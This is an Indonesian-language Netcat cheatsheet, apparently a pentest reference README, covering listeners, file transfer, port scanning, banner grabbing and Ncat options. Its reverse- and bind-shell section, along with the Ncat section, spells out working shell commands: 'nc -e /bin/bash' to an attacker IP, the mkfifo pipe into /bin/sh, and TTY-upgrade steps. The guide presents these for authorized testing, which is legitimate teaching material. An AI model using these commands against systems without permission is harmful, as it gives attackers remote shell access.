# 🔌 Ultimate Netcat Cheatsheet

Panduan praktis dan ringkasan lengkap penggunaan **Netcat** (*nc*) — "pisau lipat" jaringan yang digunakan untuk membuat koneksi TCP/UDP manual, *reverse shell*, transfer file, hingga *port scanning* sederhana.

---

## 📋 Daftar Isi
1. [Sintaks Dasar & Konsep](#1-sintaks-dasar--konsep)
2. [Mode Listener (Server)](#2-mode-listener-server)
3. [Mode Client (Connect)](#3-mode-client-connect)
4. [Reverse Shell & Bind Shell](#4-reverse-shell--bind-shell)
5. [Transfer File dengan Netcat](#5-transfer-file-dengan-netcat)
6. [Port Scanning dengan Netcat](#6-port-scanning-dengan-netcat)
7. [Banner Grabbing & Chat Sederhana](#7-banner-grabbing--chat-sederhana)
8. [Ncat (Pengganti Modern Netcat)](#8-ncat-pengganti-modern-netcat)
9. [Tabel Referensi Flag Populer](#9-tabel-referensi-flag-populer)

---

## 1. Sintaks Dasar & Konsep

Format umum penggunaan Netcat:

```bash
nc [opsi] <host> <port>
```

> ⚠️ **PENTING:** Netcat pada dasarnya hanya membuat "pipa" TCP/UDP mentah antar dua titik. Tidak ada enkripsi, tidak ada autentikasi bawaan — semua data dikirim dalam bentuk *plaintext*. Gunakan hanya di jaringan yang terpercaya atau lingkungan pengujian.

### Dua Peran Utama Netcat:
* **Listener** — menunggu koneksi masuk pada port tertentu (seperti server).
* **Client** — menghubungi listener yang sedang berjalan di host lain.

---

## 2. Mode Listener (Server)

### 🔹 Listener Dasar
```bash
nc -lvnp 4444
```
* **`-l`**: Mengaktifkan mode *listen* (menunggu koneksi masuk).
* **`-v`**: Mode *verbose*, menampilkan detail koneksi.
* **`-n`**: Tidak melakukan resolusi DNS (mempercepat proses, menghindari lookup yang bocor ke DNS server).
* **`-p <port>`**: Menentukan port yang didengarkan.

### 🔹 Listener Persisten (Otomatis Ulang Setelah Terputus)
```bash
nc -lvnp 4444 -k
```
* **`-k`**: Membuat listener tetap aktif dan siap menerima koneksi baru setelah koneksi sebelumnya terputus (didukung penuh di *Ncat*, sebagian di beberapa varian `nc`).

---

## 3. Mode Client (Connect)

### 🔹 Menghubungi Listener
```bash
nc -nv 192.168.1.10 4444
```
* **`-n`**: Tidak resolusi DNS.
* **`-v`**: Mode verbose.

### 🔹 Koneksi via UDP (`-u`)
```bash
nc -u -nv 192.168.1.10 53
```
* **`-u`**: Menggunakan protokol UDP, bukan TCP (default).

---

## 4. Reverse Shell & Bind Shell

> 🚨 Bagian ini hanya untuk digunakan pada sistem sendiri atau target yang sudah memiliki izin pengujian resmi (*authorized penetration testing*).

### 🔹 Reverse Shell (Target Menghubungi Penyerang)

**Di mesin penyerang (listener):**
```bash
nc -lvnp 4444
```

**Di mesin target (setelah command execution tercapai):**
```bash
nc -e /bin/bash 192.168.1.5 4444
```
* **`-e <program>`**: Menjalankan program (misal `/bin/bash`) dan menghubungkan input/output-nya langsung ke koneksi jaringan. Sebagian besar `nc` modern (misal versi OpenBSD) **menghapus flag `-e`** karena alasan keamanan.

**Alternatif tanpa `-e` (menggunakan named pipe / FIFO):**
```bash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.5 4444 > /tmp/f
```
* **Penjelasan:** Membuat *named pipe* untuk menyalurkan input/output shell secara manual ke koneksi Netcat, digunakan ketika versi `nc` target tidak mendukung `-e`.

### 🔹 Bind Shell (Penyerang Menghubungi Target)

**Di mesin target (listener menunggu):**
```bash
nc -lvnp 4444 -e /bin/bash
```

**Di mesin penyerang (connect ke target):**
```bash
nc -nv 192.168.1.20 4444
```
* **Penjelasan:** Kebalikan dari reverse shell — target yang membuka port dan menunggu, penyerang yang menghubungi. Teknik ini sering diblokir firewall karena membutuhkan *inbound port* terbuka di sisi target.

### 🔹 Upgrade Shell Menjadi TTY Penuh
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z lalu:
stty raw -echo; fg
```
* **Penjelasan:** Shell mentah dari Netcat biasanya tidak mendukung *tab completion*, `Ctrl+C`, atau editor interaktif (`vim`, `nano`). Urutan perintah ini mengubahnya menjadi TTY interaktif penuh.

---

## 5. Transfer File dengan Netcat

### 🔹 Mengirim File (Sisi Pengirim)
```bash
nc -nv 192.168.1.10 4444 < file.txt
```

### 🔹 Menerima File (Sisi Penerima / Listener)
```bash
nc -lvnp 4444 > file.txt
```
* **Penjelasan:** Listener menyimpan seluruh data yang diterima langsung ke berkas `file.txt`. Pastikan koneksi ditutup (`Ctrl+C` di sisi pengirim setelah selesai) agar berkas tersimpan sempurna.

---

## 6. Port Scanning dengan Netcat

### 🔹 Scan Port Tunggal / Rentang Port (`-z`)
```bash
nc -zv 192.168.1.10 20-100
```
* **`-z`**: Mode *zero-I/O*, hanya memeriksa apakah port terbuka tanpa mengirim data (mirip *port scan* ringan).
* **`-v`**: Menampilkan hasil port yang terbuka/tertutup.

### 🔹 Mempercepat Scan dengan Timeout (`-w`)
```bash
nc -zv -w 1 192.168.1.10 1-1000
```
* **`-w <detik>`**: Menentukan batas waktu tunggu koneksi sebelum dianggap gagal — mempercepat proses scan pada port yang tertutup/terfilter.

> 💡 **Tips:** Untuk *port scanning* serius, gunakan **Nmap** (lihat [`Nmap/README.md`](../Nmap)) — Netcat hanya cocok untuk pengecekan cepat satu-dua port saat Nmap tidak tersedia di target.

---

## 7. Banner Grabbing & Chat Sederhana

### 🔹 Banner Grabbing
```bash
nc -nv 192.168.1.10 22
```
* **Penjelasan:** Menghubungkan langsung ke port service (misal SSH/FTP/HTTP) untuk melihat *banner* yang ditampilkan — membantu mengidentifikasi versi perangkat lunak yang berjalan.

### 🔹 Mengirim Request HTTP Manual
```bash
printf 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n' | nc example.com 80
```
* **Penjelasan:** Mengirim *raw HTTP request* langsung melalui Netcat, berguna untuk debugging respon server tanpa browser.

### 🔹 Chat Sederhana Antar Dua Host
```bash
# Host A (listener):
nc -lvnp 4444

# Host B (client):
nc -nv 192.168.1.10 4444
```
* **Penjelasan:** Setelah koneksi terbentuk, apa pun yang diketik di satu sisi akan muncul di sisi lain secara real-time — berguna untuk pengujian konektivitas dasar antar host.

---

## 8. Ncat (Pengganti Modern Netcat)

**Ncat** (bagian dari paket Nmap) adalah versi Netcat modern dengan dukungan enkripsi dan fitur tambahan.

### 🔹 Listener dengan Enkripsi SSL (`--ssl`)
```bash
ncat -lvnp 4444 --ssl
```
* **`--ssl`**: Mengenkripsi seluruh trafik menggunakan TLS — tidak tersedia di `nc` klasik.

### 🔹 Reverse Shell Persisten dengan Ncat
```bash
ncat -lvnp 4444 -k -e /bin/bash
```
* **`-k`**: Listener tetap berjalan dan siap menerima banyak koneksi berturut-turut tanpa perlu dijalankan ulang manual.

### 🔹 Chat Multi-Client (Broker Mode)
```bash
ncat -lvnp 4444 --broker --chat
```
* **`--broker` / `--chat`**: Mode khusus Ncat yang memungkinkan banyak client terhubung ke satu listener sekaligus dan saling bertukar pesan (mirip *group chat*).

---

## 9. Tabel Referensi Flag Populer

| Flag | Fungsi / Deskripsi |
| :--- | :--- |
| `-l` | Mengaktifkan mode listener (menunggu koneksi masuk) |
| `-v` | Mode verbose, menampilkan detail proses koneksi |
| `-n` | Tidak melakukan resolusi DNS |
| `-p <port>` | Menentukan port yang digunakan/didengarkan |
| `-u` | Menggunakan protokol UDP alih-alih TCP |
| `-e <program>` | Menjalankan program dan menyalurkan I/O ke koneksi jaringan |
| `-z` | Mode zero-I/O, hanya cek port terbuka tanpa kirim data |
| `-w <detik>` | Batas waktu tunggu koneksi sebelum timeout |
| `-k` | Listener tetap aktif setelah koneksi terputus (Ncat) |
| `--ssl` | Mengenkripsi koneksi menggunakan TLS (Ncat) |
| `-lvnp` | Kombinasi umum: listen + verbose + no-DNS + port |

---